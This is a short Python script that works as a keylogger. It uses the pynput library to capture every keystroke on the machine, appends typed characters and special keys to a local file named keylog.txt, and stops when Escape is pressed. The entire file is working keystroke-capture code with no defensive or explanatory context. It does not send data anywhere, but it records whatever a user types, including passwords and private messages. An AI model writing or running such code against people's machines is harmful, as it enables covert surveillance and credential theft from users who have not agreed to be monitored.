from pynput import keyboard

def on_press(key):
    try:
        # Log the key pressed
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys like space, enter, etc.
        with open("keylog.txt", "a") as log_file:
            if key == keyboard.Key.space:
                log_file.write(" ")
            elif key == keyboard.Key.enter:
                log_file.write("\n")
            else:
                log_file.write(f"{str(key)}")

def on_release(key):
    # Stop the keylogger when the escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Setting up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
